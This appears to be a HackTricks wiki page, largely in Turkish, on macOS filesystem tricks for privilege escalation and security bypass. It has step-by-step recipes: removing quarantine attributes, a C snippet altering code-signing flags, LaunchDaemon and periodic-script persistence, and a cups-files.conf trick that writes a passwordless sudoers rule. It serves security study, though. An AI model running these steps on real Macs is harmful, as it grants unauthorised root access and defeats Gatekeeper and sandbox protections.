# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX izin kombinasyonları

Bir **directory** için üç izin biti, normal bir dosyadakinden farklı anlam taşır. `chmod(1)`, bir directory'ye uygulandığında execute bitini "**search**" olarak adlandırır:<sup>[[2]](#references)</sup>

> `0100` Dosyalar için sahibinin çalıştırmasına izin verir. Directory'ler için sahibinin directory'de **search** yapmasına izin verir.

- **read** - directory girdilerini (adlarını) **listeleyebilirsiniz**.
- **write** - directory'de **girdi oluşturabilir, yeniden adlandırabilir ve silebilirsiniz**. Bunun dosyanın değil, onu *içeren* directory'nin bir özelliği olduğunu unutmayın: Üst directory'ye yazabiliyorsanız, okuyamadığınız veya yazamadığınız bir dosyayı silebilirsiniz.
  - Bir **subdirectory**'yi silmek için boş olması gerekir; bu da içindeki her şeyi kaldırmak için yeterli izin gerektirir.
  - Directory'de **sticky bit** (`S_ISVTX`, `/tmp` gibi) varsa bu kısıtlanır — POSIX'e göre bir işlem, uygun ayrıcalıkları yoksa bu directory'deki dosyaları yalnızca dosyanın sahibi, directory'nin sahibi olduğu zaman silebilir veya yeniden adlandırabilir.<sup>[[1]](#references)</sup>
- **execute / search** - directory'den **geçiş yapmanıza** izin verilir. Pathname çözümlemesi, her bileşeni "önceki bileşenin belirttiği directory'de" bulduğundan, path önekinin herhangi bir bileşeninde search izinlerini **kaybetmek**, leaf dosyanın kendisi herkes tarafından okunabilir olsa bile path üzerinden altındaki her şeyi erişilemez kılar.<sup>[[1]](#references)</sup>

### Tehlikeli Kombinasyonlar

**root'a ait bir dosyanın/klasörün üzerine yazmak** için:

- Path'teki bir üst **directory'nin sahibi** kullanıcıdır
- Path'teki bir üst **directory'nin sahibi**, **write access** izni olan bir **users group**'tur
- Bir **users group**, **file** üzerinde **write** access iznine sahiptir

Yukarıdaki kombinasyonlardan herhangi birinde saldırgan, ayrıcalıklı bir arbitrary write elde etmek için beklenen path'e bir **sym/hard link** **inject** edebilir.

### Klasörde root R+X özel durumu

Bu, yukarıdaki pathname çözümleme kuralının doğrudan bir sonucudur. Bir **directory yalnızca root'a R+X izni veriyorsa**, içindeki dosyalar herkes için *path üzerinden* erişilemez olur — ancak **dosyaların kendi izin bitleri yine de izin verici olabilir**. Önünde duran tek engel directory'dir.

Dolayısıyla, dosyayı **bu directory'nin dışına çıkarmanızı** sağlayan herhangi bir primitive — saldırganın seçtiği bir path'i sizin geçiş yapabildiğiniz bir konuma **taşıyan/yeniden adlandıran/kopyalayan** ayrıcalıklı bir işlem — dosyanın kendi izinlerini aşmaya hiç gerek kalmadan arbitrary read elde edilmesini sağlar:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Düşük ayrıcalıklı bir kullanıcının kaynak yolu belirleyebildiği ayrıcalıklı dosya taşıyıcılarını (yükleyiciler, log rotator’ları, çökme/diagnostic toplayıcıları, yedekleme ve "dışa aktarma" özellikleri) arayın.

## Symbolic Link / Hard Link

### İzin verilen dosya/klasör

Ayrıcalıklı bir süreç, düşük ayrıcalıklı bir kullanıcı tarafından **kontrol edilebilen** veya daha önce bu kullanıcı tarafından **oluşturulmuş olabilecek** bir **dosyaya** veri yazıyorsa kullanıcı, Symbolic veya Hard link aracılığıyla bu dosyayı başka bir dosyaya **yönlendirebilir** ve ayrıcalıklı süreç o dosyaya yazabilir.

Bir saldırganın ayrıcalıkları yükseltmek için rastgele yazma işlemini **kötüye kullanabileceği** diğer bölümleri kontrol edin.

### `O_NOFOLLOW` ile açma

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) sayfasına göre: *"Maskede `O_NOFOLLOW` kullanılmışsa ve `open()`'a geçirilen hedef dosya bir symbolic link ise `open()` başarısız olur."* Yalnızca **son** bileşen kontrol edilir; tüm **ara** bileşenler çözümlenmeye ve takip edilmeye devam eder. Bu nedenle, bir yazma işlemini `O_NOFOLLOW` ile "koruyan" bir geliştiriciye, hedef yolun herhangi bir **üst dizinine** symlink yerleştirilerek hâlâ saldırılabilir.<sup>[[3]](#references)</sup>

Aynı man sayfasında bu açığı gerçekten kapatan bayraklar belgelenmiştir:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"yola ait herhangi bir bileşen ... `open()`'a geçirilen yolda bir symbolic link ise `open()` başarısız olur."*
- **`O_RESOLVE_BENEATH`** — *"belirtilen yol çözümlemesi fd ile ilişkili dizinin dışına çıkarsa `openat()` başarısız olur."*

Aksi hâlde, önceden doğruladığınız bir dizin FD'sine göreli `openat()` kullanmak veya `realpath()` + yeniden doğrulama yapmak, yolun ortasında gerçekleşen symlink değişikliklerini durdurmanın diğer yollarıdır.

## .fileloc

**`.fileloc`** uzantılı dosyalar başka uygulamalara veya ikili dosyalara işaret edebilir; böylece açıldıklarında uygulama/ikili dosya çalıştırılır.\
Örnek:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Dosya Tanımlayıcıları

### Leak FD (no `O_CLOEXEC`)

`open` çağrısında `O_CLOEXEC` bayrağı yoksa dosya tanımlayıcısı alt süreç tarafından devralınır. Dolayısıyla ayrıcalıklı bir süreç ayrıcalıklı bir dosyayı açıp saldırganın kontrolündeki bir süreci çalıştırırsa saldırgan **ayrıcalıklı dosyanın FD’sini devralır**.

Bunun klasik örneği **OS X 10.10’daki `DYLD_PRINT_TO_FILE` LPE**’sidir ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld`, söz konusu değişken `processDyldEnvironmentVariable()` dışında ayrıştırıldığı için **restricted (suid root) binary’lerde** bile `DYLD_PRINT_TO_FILE=/path` değerini dikkate alıyordu.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` çağrısını yaparak **istenen bir konumda root sahipliğinde bir dosya oluşturuyordu**.
- FD **hiç kapatılmıyor ve close-on-exec bayrağı taşımıyordu**, bu yüzden suid binary’nin her alt süreci **root sahipliğindeki bir dosyaya yazma yetkili FD’yi devralıyordu**.
- Örneğin `DYLD_PRINT_TO_FILE=/etc/target suid_binary` komutunu çalıştırıp ardından alt süreçte devralınan FD numarasını okumak, root sahipliğindeki bir dosyaya istenen veriyi yazmayı sağlıyordu; `fcntl(fd, F_SETFL, 0)` ile `O_APPEND` bile temizlenerek dosyanın sonuna eklemek yerine üzerine yazılabiliyordu.

Ayrıcalıklı bir süreç, **`exec` çağrısıyla** kontrolünüzdeki bir şeyi çalıştırmadan önce dosya açtığında (yardımcı araçlar, `$EDITOR` üzerinden çağrılan `crontab` benzeri düzenleyiciler, ortam değişkenindeki bir yoldan açılan günlük/hata ayıklama dosyaları...) aynı durum ortaya çıkar. Devraldığınız FD’leri şu komutla listeleyin:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

2'den büyük olup kendiniz açamadığınız bir dosyaya işaret eden her şey, arbitrary-write (veya arbitrary-read) primitive'dir.

## Quarantine xattrs hilelerinden kaçının

### Kaldırın

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable flag

Bir dosya/klasör bu değiştirilemez özniteliğe sahipse üzerine xattr eklemek mümkün olmaz.

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### xattr desteği olmayan dosya sistemleri

macOS'un bağlayabildiği her dosya sistemi **genişletilmiş öznitelikleri** yerel olarak saklamaz. HFS+ ve APFS saklar; **FAT32, exFAT ve (çoğu) NFS bağlaması saklamaz** — macOS bunları `._<filename>` adlı bir **AppleDouble** yan dosyası yazarak taklit eder ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Bu, quarantine için önemlidir; çünkü xattr yalnızca aynı birime gerçekten **yazılıp geri okunabiliyorsa** korunur:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

Volume daha sonra `._` companion dosyasını yok sayan bir yoldan okunursa (veya companion dosyası kaldırılırsa/silinirse), dosya **quarantine flag olmadan** gelir — quarantine uygulanmamış bir `.app`, App Sandbox'tan kaçmak için yeterlidir; bu konu [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) bölümünde ele alınmıştır.

### `writeextattr` ACL ve AppleDouble quarantine davranışı

`writeextattr` ACL örneği, `com.apple.acl.text` AppleDouble mekanizması ve sidecar oluşturma ve doğrulama adımları için bkz. [AppleDouble/ACL quarantine bypass reproduction](macos-appledouble-acl-quarantine-bypass.md).

## İmza kontrollerini atlatma

### Platform binary kontrollerini atlatma

Bazı güvenlik kontrolleri, örneğin bir XPC servisine bağlanmaya izin vermek için, binary'nin **platform binary** olup olmadığını kontrol eder. Ancak, https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ adresinde açıklandığı gibi, bir platform binary'si (ör. /bin/ls) edinip `DYLD_INSERT_LIBRARIES` ortam değişkeniyle dyld üzerinden exploit enjekte ederek bu kontrolü atlatmak mümkündür.<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` ve `CS_FORCED_LV` flag'lerini atlatma

Çalışan bir binary'nin aşağıdaki gibi bir kodla kendi flag'lerini değiştirerek kontrolleri atlatması mümkündür:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Code Signatures Atlatma

Bundle'lar, bundle içindeki her bir **dosyanın** **hash**'ini içeren **`_CodeSignature/CodeResources`** dosyasını içerir. CodeResources'ın hash'inin de **çalıştırılabilir dosyaya gömülü** olduğunu unutmayın; bu nedenle ona da müdahale edemeyiz.

Ancak imzası denetlenmeyen bazı dosyalar vardır. Bunlar plist'te `omit` anahtarına sahip dosyalardır, örneğin:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Bir kaynağın imzasını cli üzerinden hesaplamak mümkündür:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## dmg'leri mount etme

Bir kullanıcı, mevcut bazı klasörlerin üzerine bile özel olarak oluşturulmuş bir dmg mount edebilir. Özel içerikli bir dmg paketi şu şekilde oluşturulabilir:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Genellikle macOS, diskleri `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisiyle iletişim kurarak bağlar (`/usr/libexec/diskarbitrationd` tarafından sağlanır). LaunchDaemons plist dosyasına `-d` parametresi eklenip servis yeniden başlatılırsa, günlükleri `/var/log/diskarbitrationd.log` dosyasına kaydeder.\
Ancak `hdik` ve `hdiutil` gibi araçları kullanarak doğrudan `com.apple.driver.DiskImages` kext'iyle iletişim kurmak mümkündür.

## Rastgele Yazmalar

### Periyodik sh script'leri

Script'iniz **shell script** olarak yorumlanabiliyorsa, her gün çalıştırılacak **`/etc/periodic/daily/999.local`** shell script'inin üzerine yazabilirsiniz.

Bu script'in çalıştırılmasını **taklit etmek** için şunu kullanabilirsiniz: **`sudo periodic daily`**

### Daemons

Şu örnekteki gibi, rastgele bir script çalıştıran plist ile rastgele bir **LaunchDaemon** yazın: **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers Dosyası

**arbitrary write** yetkiniz varsa, kendinize **sudo** ayrıcalıkları vermek için **`/etc/sudoers.d/`** klasöründe bir dosya oluşturabilirsiniz.

### PATH Dosyaları

**`/etc/paths`** dosyası, PATH ortam değişkenini oluşturan başlıca yerlerden biridir. Bu dosyanın üzerine yazmak için root olmanız gerekir; ancak **privileged process** tarafından tam yolu belirtilmeden bir **command** çalıştırılıyorsa, bu dosyayı değiştirerek onu **hijack** edebilirsiniz.

Ayrıca, **`/etc/paths.d`** içinde dosyalar oluşturarak **PATH** ortam değişkenine yeni klasörler ekleyebilirsiniz.

### cups-files.conf

Bu teknik [bu writeup'ta](https://www.kandji.io/blog/macos-audit-story-part1) kullanılmıştır.<sup>[[8]](#references)</sup>

Aşağıdaki içeriğe sahip `/etc/cups/cups-files.conf` dosyasını oluşturun:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

Bu işlem, izinleri 777 olan `/etc/sudoers.d/lpe` dosyasını oluşturur. Sondaki fazladan içerik, hata günlüğünün oluşturulmasını tetiklemek içindir.

Ardından, ayrıcalıkları yükseltmek için gereken yapılandırmayı `/etc/sudoers.d/lpe` dosyasına yazın; örneğin `%staff ALL=(ALL) NOPASSWD:ALL`.

Sonra, `cupsctl` komutunu çağırarak yeni sudoers dosyasının geçerli olmasını sağlamak için `/etc/cups/cups-files.conf` dosyasını yeniden düzenleyip `LogFilePerm 700` satırını ekleyin.

### Sandbox Escape

FS arbitrary write ile macOS sandbox'ından kaçmak mümkündür. Bazı örnekler için [macOS Auto Start](../../../../macos-auto-start-locations.md) sayfasına bakın. Yaygın yöntemlerden biri, başlangıçta bir komut çalıştıran bir Terminal tercih dosyasını `~/Library/Preferences/com.apple.Terminal.plist` konumuna yazmak ve bunu `open` kullanarak çağırmaktır.

## Diğer kullanıcılar olarak yazılabilir dosyalar oluşturma

Çok yaygın bir privesc primitive'i, **ayrıcalıklı bir sürecin denetiminizdeki bir dizinde sizin için dosya oluşturmasını** sağlamak ve ardından bu dosya üzerinde **yazma erişimini** korumaktır. Bunun için iki şey gerekir:

1. Sahibi olduğunuz (veya **devralınabilir bir ACL** ayarlayabildiğiniz) bir dizin; böylece içinde oluşturulan her şey izinlerinizi devralır.
2. Genellikle bir hata ayıklama/günlükleme ortam değişkeni, yapılandırma dosyası veya yardımcı programın XPC API'si aracılığıyla, **nerede** dosya oluşturacağı söylenebilen ayrıcalıklı/`suid` bir süreç.

**Devralınabilir ACL** kısmı, dosya başka bir kullanıcıya ait olsa bile onu yazılabilir kılar. `file_inherit` / `directory_inherit` devralma bayrakları [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) içinde belgelenmiştir:<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Artık ayrıcalıklı bir işlemin `$DIRNAME` içinde oluşturduğu her dosya **sizin tarafınızdan yazılabilir**. Bu dizin daha sonra **root olarak çalıştırılan** bir konumsa (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, bir LaunchDaemon dizini...), bu doğrudan root yetkisi yükseltmesi sağlar. Dosyayı ele geçirdikten sonra içine ne yazmanız gerektiğini öğrenmek için yukarıdaki [Sudoers File](#sudoers-file) ve [cups-files.conf](#cups-filesconf) bölümlerine bakın.

“Bir ortam değişkeni root işleminin dosya oluşturmasına neden olur ve dosya tanıtıcısı size sızar” zincirinin baştan sona işlendiği bir örnek için yukarıdaki [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) bölümüne bakın.

## POSIX Shared Memory

**POSIX shared memory**, POSIX uyumlu işletim sistemlerindeki işlemlerin ortak bir bellek alanına erişmesini sağlayarak diğer işlemler arası iletişim yöntemlerine kıyasla daha hızlı iletişim kurulmasına olanak tanır. Bu yöntem, `shm_open()` ile bir shared memory nesnesi oluşturmayı veya açmayı, `ftruncate()` ile boyutunu ayarlamayı ve `mmap()` kullanarak işlemin adres alanına eşlemeyi içerir. İşlemler daha sonra bu bellek alanından doğrudan okuyabilir ve buraya yazabilir. Eşzamanlı erişimi yönetmek ve veri bozulmasını önlemek için genellikle mutex veya semaphore gibi senkronizasyon mekanizmaları kullanılır. Son olarak işlemler, `munmap()` ve `close()` ile shared memory eşlemesini kaldırır ve bağlantıyı kapatır; isteğe bağlı olarak `shm_unlink()` ile bellek nesnesini kaldırır. Bu sistem, birden fazla işlemin paylaşılan verilere hızla erişmesi gereken ortamlarda verimli ve hızlı IPC için özellikle etkilidir.

<details>

<summary>Üretici Kod Örneği</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Tüketici Kod Örneği</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Korunan Dosya Tanımlayıcıları

**macOSCguarded tanımlayıcıları**, kullanıcı uygulamalarındaki **file descriptor işlemlerinin** güvenliğini ve güvenilirliğini artırmak için macOS'te sunulan bir güvenlik özelliğidir. Bu korumalı tanımlayıcılar, file descriptor'larla ilişkilendirilen ve kernel tarafından uygulanan belirli kısıtlamaları veya "korumaları" tanımlama olanağı sağlar.

Bu özellik, **yetkisiz dosya erişimi** veya **race condition** gibi bazı güvenlik açıklarını önlemek için özellikle kullanışlıdır. Bu açıklar, örneğin bir thread'in dosya açıklamasına erişmesiyle **başka bir savunmasız thread'e bu dosyaya erişim olanağı vermesi** ya da bir file descriptor'ın savunmasız bir alt süreç tarafından **devralınması** durumlarında ortaya çıkar. Bu işlevlerle ilgili bazı fonksiyonlar şunlardır:

- `guarded_open_np`: Bir guard ile file descriptor açar
- `guarded_close_np`: File descriptor'ı kapatır
- `change_fdguard_np`: Bir tanımlayıcıdaki guard işaretlerini değiştirir (guard korumasını kaldırmak da dahil)

## References

- [1] [POSIX.1-2024 — Temel Tanımlar, Böl. 4 (Dosya Erişim İzinleri, Dizin Koruması, Yol Adı Çözümleme)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man sayfası](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man sayfası](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Yerel Yetki Yükseltme](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Hangi dosya sistemleri ve cloud hizmetleri genişletilmiş öznitelikleri korur?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - macOS Sandbox Kaçışlarında Yeni Bir Dönem](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Apple Güvenlik Açıklarının Ortaya Çıkarılması: diskarbitrationd ve storagekitd Denetim Öyküsü, 1. Bölüm](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
